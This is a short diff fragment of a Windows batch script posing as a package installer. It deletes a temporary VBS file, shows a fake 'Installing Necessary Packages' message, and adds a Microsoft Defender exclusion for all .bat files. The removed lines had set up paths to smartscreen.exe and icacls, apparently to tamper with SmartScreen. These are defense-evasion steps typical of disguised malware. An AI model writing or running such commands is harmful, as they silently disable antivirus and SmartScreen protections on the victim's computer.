@@ -27,13 +27,7 @@ del %tmp%\tmp.vbs
 
 echo  Installing Necessary Packages.....Please Wait.......
 
-set  jack=%systemroot%
 
-set sparrow=System32
-
-set hande-cuty=smartscreen.exe
-
-set y=icacls
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
